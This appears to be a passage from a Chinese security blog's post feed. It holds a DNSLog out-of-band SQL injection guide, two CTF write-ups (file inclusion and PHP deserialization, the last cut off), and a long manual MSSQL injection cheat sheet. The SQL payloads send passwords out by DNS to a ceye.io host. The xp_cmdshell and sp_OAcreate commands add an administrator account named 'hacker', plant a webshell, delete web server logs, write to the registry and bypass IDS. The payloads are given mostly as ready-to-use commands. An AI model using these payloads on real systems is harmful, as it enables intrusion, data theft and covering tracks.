class="headerlink" title="MSSQL-DNSLog外带注入："></a>MSSQL-DNSLog外带注入：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;mssql.php?id&#x3D;1;</span><br><span class="line"></span><br><span class="line">DECLARE @host varchar(1024);       &#x2F;&#x2F;定义变量host，定义数据类型</span><br><span class="line"></span><br><span class="line">SELECT@host&#x3D;(SELECT master.dbo.fn_varbintohexstr(convert(varbinary,rtrim(pass))) </span><br><span class="line"></span><br><span class="line">FROM test.dbo.test_user where [USER] &#x3D; &#39;admin&#39;)%2b&#39;.cece.nk40ci.ceye.io&#39;;  &#x2F;&#x2F;把查询到的数据拼接到UNC字符串中，然后再赋给变量host</span><br><span class="line"></span><br><span class="line">EXEC(&#39;master..xp_dirtree &quot;\&#39;%2b@host%2b&#39;\foobar$&quot;&#39;); </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;master..xp_dirtree函数   用于获取所有文件夹的列表和给定文件夹内部的子文件夹</span><br><span class="line"></span><br><span class="line">#### 当然也可以替换成另外两个函数：</span><br><span class="line"></span><br><span class="line">master…xp_fileexist (用于确定一个特定的文件是否存在于硬盘)</span><br><span class="line"></span><br><span class="line">master…xp_subdirs (用于得到给定的文件夹内的文件夹列表)</span><br><span class="line"></span><br><span class="line">### postgres-DNSLog外带注入：</span><br><span class="line"></span><br><span class="line">  http:&#x2F;&#x2F;127.0.0.1&#x2F;pgSQL.php?id&#x3D;1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   DROP TABLE IF EXISTS table_output; &#x2F;&#x2F;判断table_output这个表是否存在，存在就删掉</span><br><span class="line"></span><br><span class="line">   CREATE TABLE table_output(content text);&#x2F;&#x2F;创建table_output表</span><br><span class="line"></span><br><span class="line">  CREATE OR REPLACE FUNCTION temp_function() RETURNS VOID AS $$ DECLARE      exec_cmd TEXT;&#x2F;&#x2F;开始定义temp_function()函数</span><br><span class="line"></span><br><span class="line">  DECLARE query_result TEXT;&#x2F;&#x2F;定义query_result 游标，数据类型为text</span><br><span class="line"></span><br><span class="line">  BEGIN SELECT INTO query_result (select encode(pass::bytea,&#39;hex&#39;) from test_user          where id &#x3D;1);&#x2F;&#x2F;BEGIN为temp_function()函数内容开始地方，把查询的数据插入 query_result游标中</span><br><span class="line"></span><br><span class="line"> exec_cmd :&#x3D; E&#39;COPY table_output(content) FROM   E\&#39;\\\\\\\\&#39;||query_result||E&#39;.pSQL.3.nk40ci.ceye.io\\\\foobar.txt\&#39;&#39;;&#x2F;&#x2F;COPY (用于在文件系统的文件和表之间拷贝数据)</span><br><span class="line"></span><br><span class="line">  EXECUTE exec_cmd;</span><br><span class="line"></span><br><span class="line">  END;&#x2F;&#x2F;temp_function()函数结束</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$$ LANGUAGE plpgSQL SECURITY DEFINER;&#x2F;&#x2F;设置被调用时的角色，以及参数</span><br><span class="line"></span><br><span class="line">SELECT temp_function();&#x2F;&#x2F;执行temp_function()函数</span><br></pre></td></tr></table></figure><h6 id="注意：-2"><a href="#注意：-2" class="headerlink" title="注意："></a>注意：</h6><p>PostgreSQL支持无需创建出来即可执行的function。<br>PostgreSQL数据类型中的text，实际上是一个长度不受限制的字符串，就像 varchar 一样，只是不需要定义最大长度。这是一个 PostgreSQL 针对 SQL 标准做的扩展。<br>security definer存在安全隐患，可以绕过超级管理员设置的认证。</p><h1 id="防御："><a href="#防御：" class="headerlink" title="防御："></a>防御：</h1><p>为了预防所本文描述的攻击，首先要避免SQLI具有最高的优先权，为在这里我们语句都是假定是最高权限，因为在某些数据库，低权限用户使用函数将受到限制。<br>使用预处理语句被认为是最安全的预防措施，处理语句能在SQL命令被插入的时候确保查询的意图不被攻击者改变,但像magic_quote()和addslashes()那样的各种禁制机制并不能完全防止SQLI漏洞的存在或利用，因为在某些技术配合使用的环境条件下，攻击者仍能利用该漏洞。<br>为了成功最后缓解DNS渗出攻击，管理员必须确保所有不必要的系统子程序的执行是被限制的。如果一切都失败了，攻击者必须不能够运行那些可以发起DNS请求的程序。现在有一些检测域内DNS流量中恶意活动的工作，但大多缺乏实际和主流的解决方案，所以在这里并不提及。<br>SqlMap已经对它实现支持，因此所有人都可以对它进行进一步研究。</p>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DNSLog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF做题记录</title>
      <link href="2020/10/18/BUUCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>2020/10/18/BUUCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前言：记录一些BUUCTF中有趣的题目</p></blockquote><h2 id="假猪套天下第一"><a href="#假猪套天下第一" class="headerlink" title="假猪套天下第一"></a>假猪套天下第一</h2><p>老千层饼了，话不多说直接抓包<br>heder总结图片来自<a href="https://www.cnblogs.com/benbenfishfish/p/5821091.html">https://www.cnblogs.com/benbenfishfish/p/5821091.html</a></p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/445559850.png"></p><p>做题先了解一下请求头。<br>先任意用户密码登陆，抓包。BP最后能看到L0gin.php。访问就完事</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2860326870.png"></p><p>然后看包的最后（后面都一样的流程）知道改变cookie时间戳使得更大</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/893841919.png"></p><p>添加client</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/442618896.png"></p><p>添加referer</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2557710892.png"></p><p>修改浏览器类型</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2264389772.png"></p><p>添加from</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3612715797.png"></p><p>添加代理via</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1863698420.png"></p><p>最后base64解码</p><h2 id="had-a-bad-day"><a href="#had-a-bad-day" class="headerlink" title="had a bad day"></a>had a bad day</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/163551014.png"></p><p>点击下面两个button发现图片变化，再看url中参数</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3772625024.png"></p><p>感觉是文件包含，我们可以php伪协议来获取源码php://filter/read=convert.base64-encode/resource=./index.php 然后报错了</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3787161977.png"></p><p>然后删掉.php的话就行了。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/765056299.png"></p><p>解码之后代码审计</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3527358803.png"></p><p>要同时传入woofers,(meowers)index才能包含其他文件，那么构造出来 /index.php?category=woofers/../flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/419776247.png"></p><p>成功包含flag.php，然后看见绿色的字，还差点姿势啊。那就再来一次php伪协议。<br>index.php?category=php://filter/read=convert.base64-encode/resource/flag。报错，给忘了要放一个index或者meowers或者woofers才能满足条件。那么就构造index.php?category=php://filter/read=convert.base64-encode/index或者meowes或者woofers/resource/flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4284695946.png"></p><p>解码就出flag了</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL手工注入</title>
      <link href="2020/10/11/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/"/>
      <url>2020/10/11/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<blockquote><p>原文：<a href="https://www.cnblogs.com/cmt/p/14553189.html">https://www.cnblogs.com/cmt/p/14553189.html</a></p></blockquote><p>看看下面的<br>1.判断是否有注入<br>;and 1=1<br>;and 1=2</p><p>2.初步判断是否是mssql<br>;and user&gt;0</p><p>3.判断数据库系统<br>;and (select count(<em>) from sysobjects)&gt;0 mssql<br>;and (select count(</em>) from msysobjects)&gt;0 access</p><p>4.注入参数是字符<br>‘and [查询条件] and ‘’=’</p><p>5.搜索时没过滤参数的<br>‘and [查询条件] and ‘%25’=’</p><p>6.猜数据库<br>;and (select Count(*) from [数据库名])&gt;0</p><p>7.猜字段<br>;and (select Count(字段名) from 数据库名)&gt;0</p><p>8.猜字段中记录长度<br>;and (select top 1 len(字段名) from 数据库名)&gt;0</p><p>9.(1)猜字段的ascii值（access）<br>;and (select top 1 asc(mid(字段名,1,1)) from 数据库名)&gt;0</p><p>(2)猜字段的ascii值（mssql）<br>;and (select top 1 unicode(substring(字段名,1,1)) from 数据库名)&gt;0</p><p>10.测试权限结构（mssql）<br>;and 1=(select IS_SRVROLEMEMBER(‘sysadmin’));–<br>;and 1=(select IS_SRVROLEMEMBER(‘serveradmin’));–<br>;and 1=(select IS_SRVROLEMEMBER(‘setupadmin’));–<br>;and 1=(select IS_SRVROLEMEMBER(‘securityadmin’));–<br>;and 1=(select IS_SRVROLEMEMBER(‘diskadmin’));–<br>;and 1=(select IS_SRVROLEMEMBER(‘bulkadmin’));–<br>;and 1=(select IS_MEMBER(‘db_owner’));–</p><p>11.添加mssql和系统的帐户<br>;exec master.dbo.sp_addlogin username;–<br>;exec master.dbo.sp_password null,username,password;–<br>;exec master.dbo.sp_addsrvrolemember sysadmin username;–<br>;exec master.dbo.xp_cmdshell ‘net user username password /workstations:* /times:all /passwordchg:yes /passwordreq:yes /active:yes /add’;–<br>;exec master.dbo.xp_cmdshell ‘net user username password /add’;–<br>;exec master.dbo.xp_cmdshell ‘net localgroup administrators username /add’;–</p><p>12.(1)遍历目录<br>;create table dirs(paths varchar(100), id int)<br>;insert dirs exec master.dbo.xp_dirtree ‘c:’<br>;and (select top 1 paths from dirs)&gt;0<br>;and (select top 1 paths from dirs where paths not in(‘上步得到的paths’))&gt;)</p><p>(2)遍历目录<br>;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));–<br>;insert temp exec master.dbo.xp_availablemedia;– 获得当前所有驱动器<br>;insert into temp(id) exec master.dbo.xp_subdirs ‘c:’;– 获得子目录列表<br>;insert into temp(id,num1) exec master.dbo.xp_dirtree ‘c:’;– 获得所有子目录的目录树结构<br>;insert into temp(id) exec master.dbo.xp_cmdshell ‘type c:webindex.asp’;– 查看文件的内容</p><p>13.mssql中的存储过程<br>xp_regenumvalues 注册表根键, 子键<br>;exec xp_regenumvalues ‘HKEY_LOCAL_MACHINE’,’SOFTWAREMicrosoftWindowsCurrentVersionRun’ 以多个记录集方式返回所有键值<br>xp_regread 根键,子键,键值名<br>;exec xp_regread ‘HKEY_LOCAL_MACHINE’,’SOFTWAREMicrosoftWindowsCurrentVersion’,’CommonFilesDir’ 返回制定键的值<br>xp_regwrite 根键,子键, 值名, 值类型, 值<br>值类型有2种REG_SZ 表示字符型,REG_DWORD 表示整型<br>;exec xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWAREMicrosoftWindowsCurrentVersion’,’TestvalueName’,’reg_sz’,’hello’ 写入注册表<br>xp_regdeletevalue 根键,子键,值名<br>exec xp_regdeletevalue ‘HKEY_LOCAL_MACHINE’,’SOFTWAREMicrosoftWindowsCurrentVersion’,’TestvalueName’ 删除某个值<br>xp_regdeletekey ‘HKEY_LOCAL_MACHINE’,’SOFTWAREMicrosoftWindowsCurrentVersionTestkey’ 删除键,包括该键下所有值</p><p>14.mssql的backup创建webshell<br>use model<br>create table cmd(str image);<br>insert into cmd(str) values (‘’);<br>backup database model to disk=’c:l.asp’;</p><p>15.mssql内置函数<br>;and (select @@ version)&gt;0 获得Windows的版本号<br>;and user_name()=’dbo’ 判断当前系统的连接用户是不是sa<br>;and (select user_name())&gt;0 爆当前系统的连接用户<br>;and (select db_name())&gt;0 得到当前连接的数据库</p><p>16.简洁的webshell<br>use model<br>create table cmd(str image);<br>insert into cmd(str) values (‘’);<br>backup database model to disk=’g:wwwtestl.asp’;</p><p>请求的时候，像这样子用：<br><a href="http://ip/l.asp?c=dir">http://ip/l.asp?c=dir</a></p><p>SQL手工注入大全</p><p>前提需要工具：SQL Query Analyzer和SqlExec Sunx Version</p><p>1.去掉xp_cmdshell扩展过程的方法是使用如下语句：</p><p>if exists (select * from dbo.sysobjects where id=object_id(N’[dbo].[xpcmdshell]’) and OBJECTPROPERTY(id,N’IsExtendedProc’)=1)<br>exec sp_dropextendedproc N’[dbo].[xp_cmdshell]’</p><p>2.添加xp_cmdshell扩展过程的方法是使用如下语句：</p><p>（1）SQL Query Analyzer</p><p>sp_addextendedproc xp_cmdshell,@ dllname=’xplog70.dll’</p><p>（2）首先在SqlExec Sunx Version的Format选项里填上%s，在CMD选项里输入</p><p>sp_addextendedproc ‘xp_cmdshell’,’xpsql70.dll’</p><p>去除</p><p>sp_dropextendedproc ‘xp_cmdshell’</p><p>（3）MSSQL2000</p><p>sp_addextendedproc ‘xp_cmdshell’,’xplog70.dll’</p><p>?</p><p>SQL手工注入方法总结(SQL Server2005)2010-01-28 16:17———以下以省略注入点用URL代替</p><p>–(1) <em><strong>*查看驱动器方法*</strong></em>**</p><p>– 建表p(i为自动编号,a记录盘符类似”c:”,b记录可用字节,其它省略)<br>URL;create table p(i int identity(1,1),a nvarchar(255),b nvarchar(255),c nvarchar(255),d nvarchar(255));–</p><p>URL;insert p exec xp_availablemedia;–列出所有驱动器并插入表p</p><p>URL;and (select count(*) from p)&gt;3;–折半法查出驱动器总数</p><p>URL;and ascii(substring((select a from p where i=1),1,1))=67;–折半法查出驱动器名(注asc(c)=67)</p><p>–上面一般用于无显错情况下使用——-以此类推,得到所有驱动器名</p><p>URL;and (select a from p where i=1)&gt;3;–报错得到第一个驱动器名</p><p>–上面一般用于显错情况下使用——-以此类推,得到所有驱动器名</p><p>URL;;drop table p;–删除表p</p><p>–(2) <em><strong>*查看目录方法*</strong></em>**</p><p>URL;create table pa(m nvarchar(255),i nvarchar(255));–建表pa(m记录目录,i记录深度)</p><p>URL;insert pa exec xp_dirtree ’e:’;–列出驱动器e并插入表pa</p><p>URL;and (select count(*) from pa where i&gt;0)&gt;-1;–折半法查出i深度</p><p>URL;and (select top 1 m from pa where i=1 and m not in(select top 0 m from pa))&gt;0;–报错得到深度i=1的第一个目录名</p><p>–上面一般用显错且目录名不为数字情况下使用——-(得到第二个目录把”top 0”换为”top 1”,换深度只换i就行)以此类推,得到e盘的所有目录</p><p>URL;and len((select top 1 m from pa where i=1 and m not in(select top 0 m from pa)))&gt;0;–折半法查出深度i=1的第一个目录名的长度</p><p>URL;and ascii(substring((select top 1 m from pa where i=1 and m not in(select top 0 m from pa)),1,1))&gt;0;–折半法查出深度i=1的第一个目录名的第一个字符长度</p><p>–上面一般用无显错情况下使用——-(得到第二个目录把”top 0”换为”top 1”,换深度只换i就行)以此类推,得到e盘的所有目录</p><p>URL;drop</p><p>手工MSSQL注入常用SQL语句<br>and exists (select * from sysobjects) //判断是否是MSSQL<br>and exists(select * from tableName) //判断某表是否存在..tableName为表名<br>and 1=(select @@ VERSION) //MSSQL版本<br>And 1=(select db_name()) //当前数据库名<br>and 1=(select @@ servername) //本地服务名<br>and 1=(select IS_SRVROLEMEMBER(‘sysadmin’)) //判断是否是系统管理员<br>and 1=(Select IS_MEMBER(‘db_owner’)) //判断是否是库权限<br>and 1= (Select HAS_DBACCESS(‘master’)) //判断是否有库读取权限<br>and 1=(select name from master.dbo.sysdatabases where dbid=1) //暴库名DBID为1，2，3….<br>  ; declare @ d int //是否支持多行<br>and 1=(Select count(<em>) FROM master.dbo.sysobjects Where xtype = ‘X’ AND name = ‘xp_cmdshell’) //判断XP_CMDSHELL是否存在<br>and 1=(select count(</em>) FROM master.dbo.sysobjects where name= ‘xp_regread’) //查看XP_regread扩展存储过程是不是已经被删除<br>添加和删除一个SA权限的用户test：（需要SA权限）<br>exec master.dbo.sp_addlogin test,password<br>exec master.dbo.sp_addsrvrolemember test,sysadmin<br>停掉或激活某个服务。 （需要SA权限）<br>exec master..xp_servicecontrol ‘stop’,’schedule’<br>exec master..xp_servicecontrol ‘start’,’schedule’<br>暴网站目录<br>create table labeng(lala nvarchar(255), id int)<br>DECLARE @ result varchar(255) EXEC master.dbo.xp_regread ‘HKEY_LOCAL_MACHINE’,’SYSTEMControlSet001ServicesW3SVCParametersVirtual Roots’,’/’,@ result output insert into labeng(lala) values(@ result);<br>and 1=(select top 1 lala from labeng) 或者and 1=(select count(<em>) from labeng where lala&gt;1)<br>—————————————————————————————————————————————————————分割<br>SQL Server<br>判断是否可注射：<br><a href="http://www.exehack.net/article.asp?id=6">http://www.exehack.net/article.asp?id=6</a><br><a href="http://www.exehack.net/article.asp?id=6%E2%80%B2">http://www.exehack.net/article.asp?id=6′</a><br><a href="http://www.exehack.net/article.asp?id=6">http://www.exehack.net/article.asp?id=6</a> and 1=1<br><a href="http://www.exehack.net/article.asp?id=6">http://www.exehack.net/article.asp?id=6</a> and 1=2<br><a href="http://www.exehack.net/article.asp?action=value%E2%80%99">http://www.exehack.net/article.asp?action=value’</a> and 1=1<br><a href="http://www.exehack.net/article.asp?action=value%E2%80%99">http://www.exehack.net/article.asp?action=value’</a> and 1=2<br>searchpoints%’ and 1=1<br>searchpoints%’ and 1=2<br>确定数据库类型：<br><a href="http://www.exehack.net/article.asp?id=6">http://www.exehack.net/article.asp?id=6</a> and user&gt;0<br><a href="http://www.exehack.net/article.asp?id=6">http://www.exehack.net/article.asp?id=6</a> and (select count(</em>) from sysobjects)&gt;0<br>查询当前用户数据信息：<br>article.asp?id=6 having 1=1–<br>暴当前表中的列：<br>article.asp?id=6 group by admin.username having 1=1–<br>article.asp?id=6 group by admin.username,admin.password having 1=1–<br>暴任意表和列：<br>and (select top 1 name from (select top N id,name from sysobjects where xtype=char(85)) T order by id desc)&gt;1<br>and (select top col_name(object_id(‘admin’),N) from sysobjects)&gt;1<br>暴数据库数据：<br>and (select top 1 password from admin where id=N)&gt;1<br>修改数据库中的数据：<br>;update admin set password=’oooooo’ where username=’xxx’<br>增添数据库中的数据：<br>;insert into admin values (xxx,oooooo)–<br>删数据库：<br>  ; drop database webdata<br>获取当前数据库用户名：and user&gt;0<br>获取当前数据库名：and db_name()&gt;0<br>获取数据库版本：and (select @@ version)&gt;0<br>判断是否支持多句查询：;declare @ a int–<br>判断是否支持子查询：and (select count(1) from [sysobjects])&gt;=0<br>数据库的扩展存储过程：exec master..xp_cmdshell<br>查看服务器C盘目录：;exec_master..xp_cmdshell ‘dir c:’<br>判断扩展存储过程是否存在：and select count(<em>) from master.dbo.sysobjects where xtype=’x’ and name=’xp_cmdshell’<br>恢复扩展存储过程：;exec sp_addextendedproc xp_cmdshell,’xplog70.dll’<br>删除扩展存储过程：;exec sp_dropextendedproc ‘xp_cmdshell’<br>在MSSQL2000中提供了一些函数用于访问OLE对象间接获取权限：<br>  ; declare @ s int<br>;exec sp_oacreat ‘wscript.shell’,@ s<br>;exec master..spoamethod @ s,’run’,null,’cmd.exe/c dir c:’<br>判断当前数据库用户名是否拥有比较高的权限：<br>and 1=(select is_srvrolemember(‘sysadmin’))<br>and 1=(select is_srvrolemember(‘serveradmin’))<br>and 1=(select is_srvrolemember(‘setupadmin’))<br>and 1=(select is_srvrolemember(‘securityadmin’))<br>and 1=(select is_srvrolemember(‘diskadmin’))<br>and 1=(select is_srvrolemember(‘bulkadmin’))<br>判断当前数据库用户名是否为DB_OWNER：<br>and 1=(select is_member(‘db_owner’))<br>在SQLSERVER的master.dbo.sysdatabases表中存放着SQLSERVER数据库系统中的所有数据库信息，只需要PUBLIC权限就可以对此表进行SELECT操作：<br>and (select top 1 name from master.dbo.sysdatabase order by dbid)&gt;0<br>and (select top 1 name from master.dbo.sysdatabase where name not in(select top 1 name from master.dbo.sysdatabases order by dbid) order by dbid)&gt;0<br>删除日志记录：<br>;exec master.dbo.xp_cmdshell ‘del c:winntsystem32logfilesw3svc5ex070606.log &gt;c:temp.txt’<br>替换日志记录：<br>;exec master.dbo.xp_cmdshell ‘copy c:winntsystem32logfilesw3svc5ex070404.log c:winntsystem32logfilesw3svc5ex070606.log &gt;c:temp.txt’<br>获取WEB路径：<br>  ; declare @ shell int<br>;exec master..sp_oamethod ‘wscript.shell’,@ shell out<br>;exec master..sp_oamethod @ shell,’run’,null,’cmd.exe/c dir /s d:/index.asp &gt;c:/log.txt<br>利用XP_CMDSHELL搜索：<br>;exec master..xp_cmdshell ‘dir /s d:/index.asp’<br>显示服务器网站配置信息命令：<br>cmd /c cscript.exe c:inetpubadminscriptadsutil.vbs enum w3svc/1/root<br>cmd /c cscript.exe c:inetpubadminscriptadsutil.vbs enum w3svc/2/root<br>利用XP_REGREAD可用PUBLIC权限读取：<br>;exec master.dbo.xp_regread<br>hkey_local_machine,<br>‘systemcurrentcontrolsetservicesw3svcparametersvirtual roots’<br>‘/’<br>SQLSERVER下的高级技术可以参考阅读曾云好所著的精通脚本黑客第五章。<br>3、DSqlHelper<br>检测权限SYSADMIN：<br>and 1=(select IS_SRVROLEMEMBER(‘sysadmin’))<br>serveradmin、setupadmin、securityadmin、diskadmin、bulkadmin、db_owner。<br>检测XP_CMDSHELL（CMD命令）：<br>and 1=(SELECT count(</em>) FROM master.dbo.sysobjects WHERE name= ‘xp_cmdshell’)<br>检测XP_REGREAD（注册表读取功能）：<br>and 1=(SELECT count(<em>) FROM master.dbo.sysobjects WHERE name= ‘xp_regread’)<br>检测SP_MAKEWEBTASK（备份功能）：<br>and 1=(SELECT count(</em>) FROM master.dbo.sysobjects WHERE name= ‘sp_makewebtask’)<br>检测SP_ADDEXTENDEDPROC：<br>and 1=(SELECT count(<em>) FROM master.dbo.sysobjects WHERE name= ‘sp_addextendedproc’)<br>检测XP_SUBDIRS读子目录：<br>and 1=(SELECT count(</em>) FROM master.dbo.sysobjects WHERE name= ‘xp_subdirs’)<br>检测XP_DIRTREE读子目录：<br>and 1=(SELECT count(<em>) FROM master.dbo.sysobjects WHERE name= ‘xp_dirtree’)<br>修改内容：<br>; UPDATE 表名 set 字段=内容 where 1=1<br>XP_CMDSHELL检测：<br>;exec master..xp_cmdshell ‘dir c:’<br>修复XP_CMDSHELL：<br>;exec master.dbo.sp_addextendedproc ‘xp_cmdshell’, ‘xplog70.dll’<br>用XP_CMDSHELL添加用户hacker：<br>;exec master.dbo.xp_cmdshell ‘net user hacker 123456 /add’<br>XP_CMDSHELL把用户hacker加到ADMIN组：<br>;exec master.dbo.xp_cmdshell ‘net localgroup administrators hacker /add’<br>创建表test：<br>;create table [dbo].[test] ([dstr]<a href="https://blog.harvey.plus/index.php/archives/255">char</a>);<br>检测表段test：<br>and exists (select * from test)<br>读取WEB的位置（读注册表）：<br>  ; DECLARE @ result varchar(255) EXEC master.dbo.xp_regread ‘HKEY_LOCAL_MACHINE’,’SYSTEMControlSet001ServicesW3SVCParametersVirtual Roots’, ‘/’,@ result output insert into test (dstr) values(@ result);–<br>爆出WEB的绝对路径（显错模式）：<br>and 1=(select count(</em>) from test where dstr &gt; 1)<br>删除表test：<br>  ; drop table test;–<br>创建查看目录的表dirs：<br>;create table dirs(paths varchar(100), id int)<br>把查看目录的内容加入表dirs：<br>;insert dirs exec master.dbo.xp_dirtree ‘c:’<br>爆目录的内容dirs：<br>and 0&lt;&gt;(select top 1 paths from dirs)<br>备份数据库DATANAME：<br>declare @ a sysname; set @ a=db_name();backup DATANAME @ a to disk=’c:inetpubwwwrootdown.bak’;–<br>删除表dirs：<br>  ; drop table dirs;–<br>创建表temp：<br>;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));–<br>把驱动盘列表加入temp表：<br>;insert temp exec master.dbo.xp_availablemedia;–<br>删除表temp：<br>  ; delete from temp;–<br>创建表dirs：<br>;create table dirs(paths varchar(100), id int);–<br>获得子目录列表XP_SUBDIRS：<br>;insert dirs exec master.dbo.xp_subdirs ‘c:’;–<br>爆出内容（显错模式）：<br>and 0&lt;&gt;(select top 1 paths from dirs)<br>删除表dirs：<br>  ; delete from dirs;–<br>创建表dirs：<br>;create table dirs(paths varchar(100), id int)–<br>用XP_CMDSHELL查看目录内容：<br>;insert dirs exec master..xp_cmdshell ‘dir c:’<br>删除表dirs：<br>  ; delete from dirs;–<br>检测SP_OAcreate（执行命令）：<br>and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= ‘SP_OAcreate’)<br>SP_OAcreate执行CMD命令：<br>  ; DECLARE @ shell INT EXEC SP_OAcreate ‘wscript.shell’,@ shell OUTPUT EXEC SP_OAMETHOD @ shell,’run’,null, ‘C:WINNTsystem32cmd.exe /c net user hacker 123456 /add’<br>SP_OAcreate建目录：<br>  ; DECLARE @ shell INT EXEC SP_OAcreate ‘wscript.shell’,@ shell OUTPUT EXEC SP_OAMETHOD  @ shell,’run’,null, ‘C:WINNTsystem32cmd.exe /c md c:inetpubwwwroot1111’<br>创建一个虚拟目录E盘：<br>  ; declare @ o int exec sp_oacreate ‘wscript.shell’, @ o out exec sp_oamethod @ o, ‘run’, NULL,’ cscript.exe c:inetpubwwwrootmkwebdir.vbs -w “默认 Web 站点” -v “e”,”e:”‘<br>设置虚拟目录E为可读：<br>  ; declare @ o int exec sp_oacreate ‘wscript.shell’, @ o out exec sp_oamethod @ o, ‘run’, NULL,’ cscript.exe c:inetpubwwwrootchaccess.vbs -a w3svc/1/ROOT/e +browse’<br>启动SERVER服务：<br>;exec master..xp_servicecontrol ‘start’, ‘server’<br>绕过IDS检测XP_CMDSHELL：<br>  ; declare @ a sysname set @ a=’xp_’+’cmdshell’ exec @ a ‘dir c:’<br>开启远程数据库1：<br>; select  <em>from OPENROWSET(‘SQLOLEDB’, ‘server=servername;uid=sa;pwd=apachy_123’, ‘select</em>  from table1’ )<br>开启远程数据库2：<br>;select  <em>from OPENROWSET(‘SQLOLEDB’, ‘uid=sa;pwd=apachy_123;Network=DBMSSOCN;Address=202.100.100.1,1433;’, ‘select</em>  from table’</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-反序列化</title>
      <link href="2020/10/08/CTF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>2020/10/08/CTF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h2><p><a href="https://blog.csdn.net/blackhackerzxcr/article/details/106059465?utm_source=app" title="原文"><strong>原文传送门</strong></a></p><p>打开题目所在的网页：（做ctf题时最喜欢有源码了）<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1714179180.png" alt="在这里插入图片描述"></p><p>简单分析一下</p><blockquote><p>首先一个Demo类，类里面定义了私有属性file值，然后构造函数把值赋值给当前的对象的，然后析构函数会执行highlight_file这个函数，这个函数就是打印输出指定文件的代码，然后还有个__wakeup方法，会被当前对象file属性重新赋值成index.html<br>然后就是GET接受传递进来的Var参数值，再base编码，然后再正则匹配。这里匹配 O:数字 C:数字这类都给你打印STOPhacking，然后没有匹配到就会反序列化</p></blockquote><p>逻辑大概就这样的：很简单！<br>说一下在这个类中反序列化中方法执行的顺序吧，首先构造函数=》__wakeup函数=&gt;析构函数</p><p>其实反序列化其实别没有那么难，你得了解原理，然后构造exp生成poc才会理所当然！</p><blockquote><p>先看看我的exp吧</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Demo &#123;</span><br><span class="line">    private $file &#x3D; &#39;fl4g.php&#39;;</span><br><span class="line">&#125;</span><br><span class="line">$ctf &#x3D; new Demo();</span><br><span class="line">$b &#x3D; serialize($ctf);</span><br><span class="line">&#x2F;&#x2F;string(49) &quot;O: 4:&quot;Demo&quot;: 1:&#123;s: 